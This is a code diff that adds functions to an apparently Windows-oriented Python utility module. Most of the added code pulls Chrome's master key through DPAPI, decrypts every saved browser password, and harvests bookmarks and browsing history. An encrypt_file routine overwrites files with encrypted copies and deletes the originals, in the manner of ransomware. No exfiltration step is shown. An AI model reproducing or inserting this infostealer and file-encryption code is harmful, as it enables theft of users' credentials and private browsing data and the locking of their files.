@@ -198,3 +198,110 @@ def get_user_token():
 
 def get_linked_token(h_token):
     return win32security.GetTokenInformation(h_token, ntsecuritycon.TokenLinkedToken)
+
+
+def get_master_key(local_state):
+    import json, base64, win32crypt
+    with open(local_state, 'r', encoding='utf-8') as f:
+        local_state = json.loads(f.read())
+        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
+        return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+
+
+def decrypt_password(master_key, buf):
+    from Crypto.Cipher import AES
+    try:
+        cipher = AES.new(master_key, AES.MODE_GCM, buf[3:15])
+        password = cipher.decrypt(buf[15:])
+        return password[:-16].decode()
+    except:
+        return None
+
+
+def get_chromium_passwords(master_key, db) -> list:
+    import tempfile, shutil, sqlite3
+    db_copy = os.path.join(tempfile.gettempdir(), r'passwords')
+    shutil.copy2(db, db_copy)
+    conn = sqlite3.connect(db_copy)
+    cursor = conn.cursor()
+    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
+    passwords = []
+    for r in cursor.fetchall():
+        url = r[0]
+        username = r[1]
+        password = decrypt_password(master_key, r[2])
+        if username and password:
+            passwords.append({'url': url, 'username': username, 'password': password})
+    cursor.close()
+    conn.close()
+    os.remove(db_copy)
+    return passwords
+
+
+def get_bookmark_children(items: dict) -> dict:
+    bookmarks = []
+    for item in items['children']:
+        if item['type'] == 'folder':
+            bookmarks.append(get_bookmark_children(item))
+        else:
+            bookmarks.append({'name:': item['name'], 'url': item['url']})
+    return {items['name']: bookmarks}
+
+
+def get_chromium_bookmarks(filename) -> list:
+    import json
+    with open(filename, encoding='utf-8') as f:
+        data = json.load(f)
+        bookmark_bar = data['roots']['bookmark_bar']
+        other = data['roots']['other']
+        return [get_bookmark_children(bookmark_bar), get_bookmark_children(other)]
+
+
+def get_chromium_history(db) -> list:
+    import tempfile, shutil, sqlite3
+    db_copy = os.path.join(tempfile.gettempdir(), r'history')
+    shutil.copy2(db, db_copy)
+    conn = sqlite3.connect(db_copy)
+    cursor = conn.cursor()
+    cursor.execute('SELECT url, title FROM urls')
+    history = []
+    for r in cursor.fetchall():
+        history.append({'title': r[1], 'url': r[0]})
+    cursor.close()
+    conn.close()
+    os.remove(db_copy)
+    return history
+
+
+def encrypt_file(filename, key, buffer_size=65536):
+    from Crypto.Cipher import AES
+    input_file = open(filename, 'rb')
+    output_file = open(filename + '.encrypted', 'wb')
+    cipher = AES.new(key, AES.MODE_CFB)
+    output_file.write(cipher.iv)
+    buffer = input_file.read(buffer_size)
+    while len(buffer) > 0:
+        bytes = cipher.encrypt(buffer)
+        output_file.write(bytes)
+        buffer = input_file.read(buffer_size)
+    input_file.close()
+    output_file.close()
+    os.remove(filename)
+    os.rename(filename + '.encrypted', filename)
+
+
+def decrypt_file(filename, key, buffer_size=65536):
+    from Crypto.Cipher import AES
+    input_file = open(filename, 'rb')
+    output_file = open(filename + '.decrypted', 'wb')
+    iv = input_file.read(16)
+    cipher = AES.new(key, AES.MODE_CFB, iv=iv)
+    buffer = input_file.read(buffer_size)
+    while len(buffer) > 0:
+        bytes = cipher.decrypt(buffer)
+        output_file.write(bytes)
+        buffer = input_file.read(buffer_size)
+    input_file.close()
+    output_file.close()
+    os.remove(filename)
+    os.rename(filename + '.decrypted', filename)
